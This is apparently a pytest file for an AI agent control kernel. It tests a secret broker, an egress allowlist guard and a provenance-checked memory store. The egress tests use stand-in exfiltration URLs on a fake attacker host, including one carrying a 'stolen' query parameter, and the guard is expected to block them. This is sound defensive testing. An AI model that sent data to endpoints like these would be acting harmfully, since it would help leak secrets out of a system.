"""Tests for the three no-bypass subsystems: secret broker, egress guard, memory."""

import pytest

from mandate.compiler.bundle import MemoryPolicy
from mandate.errors import EgressDenied, MandateError, ProvenanceRejected
from mandate.kernel.broker import SecretBroker
from mandate.kernel.egress import EgressGuard, Sandbox
from mandate.kernel.memory import MemoryStore

SECRET = "super-secret-value"


# -- broker -------------------------------------------------------------------


def broker():
    return SecretBroker({"K": "vault://acme/k"}, vault={"vault://acme/k": SECRET})


def test_broker_injects_value_into_callback_only():
    seen = {}

    def use(value):
        seen["v"] = value  # kernel-side tool code sees plaintext
        return "RESULT"  # ...and returns only a sanitized result

    result = broker().inject("K", use)
    assert seen["v"] == SECRET
    assert result == "RESULT"  # the caller gets only the sanitized result


def test_broker_reference_is_safe_but_value_is_not_exposed():
    b = broker()
    assert b.reference("K") == "vault://acme/k"
    # There is no method that returns the value to a caller.
    assert not any(
        m for m in dir(b) if "value" in m.lower() and not m.startswith("_")
    )


def test_broker_unbound_secret_raises():
    with pytest.raises(MandateError):
        broker().inject("MISSING", lambda v: v)


# -- egress -------------------------------------------------------------------


def test_egress_allows_listed_host_and_denies_others():
    guard = EgressGuard(["arxiv.org", "api.semanticscholar.org"])
    assert guard.is_allowed("arxiv.org")
    assert guard.check("https://arxiv.org/abs/1") == "arxiv.org"
    with pytest.raises(EgressDenied):
        guard.check("https://attacker.evil/collect")


def test_sandbox_only_reaches_allowed_hosts_and_audits_attempts():
    attempts = []
    sandbox = Sandbox(EgressGuard(["arxiv.org"]), on_egress=lambda url, host, ok: attempts.append((host, ok)))
    assert sandbox.fetch("https://arxiv.org/abs/1").startswith("<")
    with pytest.raises(EgressDenied):
        sandbox.fetch("https://attacker.evil/x?stolen=1")
    assert ("arxiv.org", True) in attempts
    assert ("attacker.evil", False) in attempts


# -- memory -------------------------------------------------------------------


def memstore():
    return MemoryStore(MemoryPolicy(
        require_provenance=True,
        require_fields=["source", "source_trust", "confidence", "observed_at", "owner", "expiry"],
        low_trust_source="review",
    ))


FULL_PROV = {
    "source": "s", "source_trust": "high", "confidence": 0.9,
    "observed_at": "2026-06-07", "owner": "o", "expiry": "30d",
}


def test_memory_rejects_missing_provenance():
    with pytest.raises(ProvenanceRejected):
        memstore().write("scope", {"x": 1}, provenance={})


def test_memory_holds_low_trust_long_term_write():
    store = memstore()
    rec = store.write("scope", {"x": 1}, {**FULL_PROV, "source_trust": "low"}, long_term=True)
    assert rec.status == "held_for_review"
    assert store.held and not store.committed


def test_memory_commits_trusted_write():
    store = memstore()
    rec = store.write("scope", {"x": 1}, FULL_PROV, long_term=True)
    assert rec.status == "committed"
    assert store.committed and not store.held


def test_memory_low_trust_short_term_still_commits():
    # The hold rule is specific to long-term consolidation.
    store = memstore()
    rec = store.write("scope", {"x": 1}, {**FULL_PROV, "source_trust": "low"}, long_term=False)
    assert rec.status == "committed"
